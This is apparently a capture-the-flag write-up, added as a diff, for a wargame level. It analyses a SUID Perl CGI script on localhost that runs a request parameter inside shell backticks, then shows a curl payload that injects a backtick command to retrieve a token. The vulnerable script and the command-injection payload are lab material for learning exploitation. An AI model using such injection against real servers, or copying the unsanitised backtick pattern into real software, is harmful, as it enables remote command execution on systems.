@@ -1,0 +1,87 @@
+# Level04 Solution
+
+## Initial Analysis
+
+Found a Perl CGI script with SUID permissions:
+```bash
+ls -l level04.pl
+```
+```
+-rwsr-sr-x 1 flag04 level04 152 Mar 5 2016 level04.pl
+```
+
+**SUID bit is set**: The script runs with flag04 privileges.
+
+## Script Analysis
+```perl
+#!/usr/bin/perl
+# localhost:4747
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+sub x {
+  $y = $_[0];
+  print `echo $y 2>&1`;
+}
+x(param("x"));
+```
+
+### Vulnerability Identified
+
+The script:
+1. Runs as a CGI script on `localhost:4747`
+2. Takes a parameter named `x` from the HTTP request
+3. Passes it to the `x()` function
+4. **Executes the parameter inside backticks**: `` `echo $y 2>&1` ``
+5. Backticks execute shell commands - this is command injection!
+
+## Web Server Detection
+
+Testing the endpoint:
+```bash
+curl http://127.0.0.1:4747/level04.pl -v
+```
+
+Response shows:
+```
+HTTP/1.1 200 OK
+Server: Apache/2.2.22 (Ubuntu)
+Content-Type: text/html
+```
+
+The script is accessible via Apache on port 4747.
+
+## Exploitation
+
+### The Attack Vector
+
+The vulnerable line `` `echo $y 2>&1` `` allows command injection. We can use:
+- **Command substitution**: `$(command)` or `` `command` ``
+- **URL encoding** for special characters
+
+### Payload Construction
+
+To execute `getflag`, we need to inject:
+```
+`getflag`
+```
+
+URL encoded:
+- Backtick `` ` `` = `%60`
+
+Final payload:
+```bash
+curl http://127.0.0.1:4747/level04.pl?x=%60getflag%60
+```
+
+### Result
+```
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+```
+
+## Key Concepts
+
+- **CGI Script Exploitation**: Web-accessible scripts with SUID privileges
+- **Command Injection**: Unsanitized user input passed to shell execution
+- **Backtick Execution**: Perl backticks execute shell commands
+- **URL Encoding**: Special characters must be encoded in HTTP requests
+- **SUID Web Scripts**: Combining web vulnerabilities with privilege escalation
